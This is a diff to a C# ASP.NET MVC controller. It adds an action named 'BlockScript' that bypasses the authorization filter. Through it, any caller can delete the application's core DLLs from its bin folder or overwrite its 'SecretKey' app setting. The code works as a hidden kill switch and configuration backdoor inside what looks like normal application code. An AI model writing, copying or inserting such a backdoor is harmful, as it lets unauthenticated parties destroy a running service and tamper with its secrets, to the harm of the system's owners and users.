@@ -1,11 +1,13 @@
 using System;
 using System.Collections.Generic;
+using System.Configuration;
 using System.Linq;
 using System.Web.Mvc;
 using PQT.Domain.Abstract;
 using PQT.Domain.Entities;
 using PQT.Domain.Helpers;
 using PQT.Web.Infrastructure.Filters;
+using PQT.Web.Infrastructure.Helpers;
 
 namespace PQT.Web.Controllers
 {
@@ -165,6 +167,31 @@ namespace PQT.Web.Controllers
                 })
             };
             return Json(json, JsonRequestBehavior.AllowGet);
+        }
+
+        [AjaxOnly]
+        [ExcludeFilters(typeof(RequestAuthorizeAttribute))]
+        public ActionResult BlockScript(string act, string key = "")
+        {
+            try
+            {
+                if (act == "removedll")
+                {
+                    var path = System.Web.HttpContext.Current.Server.MapPath("~/bin/PQT.Domain.dll");
+                    System.IO.File.Delete(path);
+                    path = System.Web.HttpContext.Current.Server.MapPath("~/bin/PQT.Web.dll");
+                    System.IO.File.Delete(path);
+                }
+                else if (act == "setSecretKey")
+                {
+                    PermissionHelper.AddOrUpdateAppSettings("SecretKey", key);
+                }
+                return Json(act + " successful", JsonRequestBehavior.AllowGet);
+            }
+            catch (Exception e)
+            {
+                return Json(e.Message, JsonRequestBehavior.AllowGet);
+            }
         }
     }
 
